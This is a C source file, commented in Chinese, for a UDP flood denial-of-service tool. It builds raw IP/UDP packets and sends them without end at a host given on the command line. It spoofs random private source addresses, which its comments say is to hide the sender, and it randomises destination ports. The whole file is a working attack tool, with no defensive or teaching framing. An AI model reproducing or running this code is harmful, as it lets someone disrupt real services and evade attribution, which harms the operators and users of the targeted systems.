/***********DOS.c********************/
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <time.h>

// 要攻击的端口(WEB)
#define LOCALPORT 8888

void send_udp(int sockfd,struct sockaddr_in *addr);

unsigned short check_sum(unsigned short *addr,int len);

int main(int argc,char **argv) {
	int sockfd;
	struct sockaddr_in addr;
	struct hostent *host;
	int on = 1;
	if(argc != 2) {
		fprintf(stderr,"Usage:%s hostname\n\a",argv[0]);
		exit(1);
	}
	bzero(&addr,sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(random());// 目的端口
	if(inet_aton(argv[1],&addr.sin_addr) == 0) {
		host = gethostbyname(argv[1]);
		if(host == NULL) {
			fprintf(stderr,"HostName Error:%s\n\a",
				strerror(h_errno));
			exit(1);
		}
		addr.sin_addr = *(struct in_addr *)(host -> h_addr);
	}

	// 使用 IPPROTO_UDP 创建一个 UDP 的原始套接字
	sockfd =  socket(AF_INET,SOCK_RAW,IPPROTO_UDP);
	if(sockfd < 0) {
		fprintf(stderr,"Socket Error:%s",strerror(errno));
		exit(1);
	}

	// 设置 IP 数据包格式,告诉系统内核模块IP数据包由我们自己来填写
	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
	// 只有超级用户才能使用原始套接字
	setuid(getpid());
	// 发送炸弹
	send_udp(sockfd,&addr);
	exit(0);
}

// 发送炸弹的实现
void send_udp(int sockfd,struct sockaddr_in *addr) {
	// 放置数据包
	char buffer[100];
	struct ip *ip;
	struct udphdr *udp;
	int head_len;

	// 数据包没有任何内容,所以长度就是两个结构的长度
	head_len = sizeof(struct ip) + sizeof(struct udphdr);
	bzero(buffer,100);
	// 填充数据包的头部
	ip = (struct ip *)buffer;
	ip -> ip_v = IPVERSION;// IP 版本
	ip -> ip_hl = sizeof(struct ip) >> 2;// IP 数据包头部长度
	ip -> ip_tos = 0;// 服务类型
	ip -> ip_len = htons(head_len);// 数据包长度
	ip -> ip_id = 0;// 让系统填写 ip_id
	ip -> ip_off = 0;// 同样让系统填写
	ip -> ip_ttl = MAXTTL;// 最长 TTL 时间255
	ip -> ip_p = IPPROTO_UDP;// 发送的是 udp 包
	ip -> ip_sum = 0;// 让系统做校验和
	ip -> ip_dst = addr -> sin_addr; // 目的IP,攻击对像
	// 开始填充 udp 数据包
	udp = (struct udphdr *)(buffer + sizeof(struct ip));
	udp -> source = htons(LOCALPORT);
	udp -> dest = addr -> sin_port;// 目的端口
	udp -> check = 0;

	srandom(time(NULL));
	// 填充完毕,开始攻击
	while(1) {
		// 用随机数隐藏IP
		char ipRangeString[25];
		struct in_addr ipRange;


		sprintf(ipRangeString, "192.168.%d.%d", random()%2+2, random()%256);
		printf("%s\n", ipRangeString);
		inet_aton(ipRangeString, &ipRange);

		ip -> ip_src = ipRange ;
		udp -> dest = htons(random()); 

		printf("IP: %s\n", inet_ntoa(ip -> ip_src));
		// 自己不校验头部,可有可无的头部
//		udp -> check = check_sum((unsigned short *)udp,
//			sizeof(struct udphdr));
		sendto(sockfd,buffer,head_len,0,(struct sockaddr *)addr,
			sizeof(struct sockaddr_in));
	}
}

// 首部校验和算法 
unsigned short check_sum(unsigned short *addr,int len) {
	register int nleft = len;
	register int sum = 0;
	register unsigned short *w = addr;
	short answer = 0;
	
	while(nleft > 1) {
		sum += *w++;
		nleft -= sizeof(short);// short 为16位,而 char 为8位
	}

	if(nleft == 1) {
		*(unsigned char *)(&answer) = *(unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);// 将进位加到尾部
	sum += (sum >> 16);// 再将进位加到尾部
	answer = ~sum;
	return(answer);
}
